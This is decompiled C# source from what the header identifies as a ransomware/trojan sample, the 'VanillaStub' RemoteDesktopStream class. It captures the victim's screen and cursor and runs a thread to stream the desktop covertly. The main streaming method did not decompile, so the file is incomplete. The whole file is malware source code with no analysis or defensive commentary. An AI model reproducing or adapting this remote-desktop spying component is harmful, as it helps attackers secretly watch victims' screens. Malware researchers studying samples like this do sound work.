// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.RemoteDesktopStream
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;

namespace VanillaStub.Helpers.Services
{
  public static class RemoteDesktopStream
  {
    private const int CURSOR_SHOWING = 1;
    private static Thread RemoteDestkopThread = new Thread(new ThreadStart(RemoteDesktopStream.StartRemoteDestkop));

    public static bool RemoteDesktopActive { get; set; }

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out RemoteDesktopStream.CursorInfo pci);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Start()
    {
      if (RemoteDesktopStream.RemoteDesktopActive)
        return;
      RemoteDesktopStream.RemoteDesktopActive = true;
      try
      {
        RemoteDesktopStream.RemoteDestkopThread.Start();
      }
      catch
      {
      }
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Stop()
    {
      if (!RemoteDesktopStream.RemoteDesktopActive)
        return;
      RemoteDesktopStream.RemoteDesktopActive = false;
      try
      {
        RemoteDesktopStream.RemoteDestkopThread.Abort();
        RemoteDesktopStream.RemoteDestkopThread = new Thread(new ThreadStart(RemoteDesktopStream.StartRemoteDestkop));
      }
      catch
      {
      }
    }

    private static async void StartRemoteDestkop()
    {
      // ISSUE: unable to decompile the method.
    }

    private static Bitmap GetDesktopImage()
    {
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      try
      {
        Bitmap desktopImage = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);
        Graphics graphics = Graphics.FromImage((Image) desktopImage);
        graphics.CopyFromScreen(0, 0, 0, 0, new Size(desktopImage.Width, desktopImage.Height), CopyPixelOperation.SourceCopy);
        RemoteDesktopStream.CursorInfo pci;
        pci.cbSize = Marshal.SizeOf(typeof (RemoteDesktopStream.CursorInfo));
        if (RemoteDesktopStream.GetCursorInfo(out pci) && pci.flags == 1)
        {
          RemoteDesktopStream.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
          graphics.ReleaseHdc();
        }
        graphics.Dispose();
        return desktopImage;
      }
      catch
      {
        return new Bitmap(bounds.Width, bounds.Height);
      }
    }

    private struct CursorInfo
    {
      public int cbSize;
      public readonly int flags;
      public readonly IntPtr hCursor;
      public readonly RemoteDesktopStream.PointAPI ptScreenPos;
    }

    private struct PointAPI
    {
      public readonly int x;
      public readonly int y;
    }
  }
}
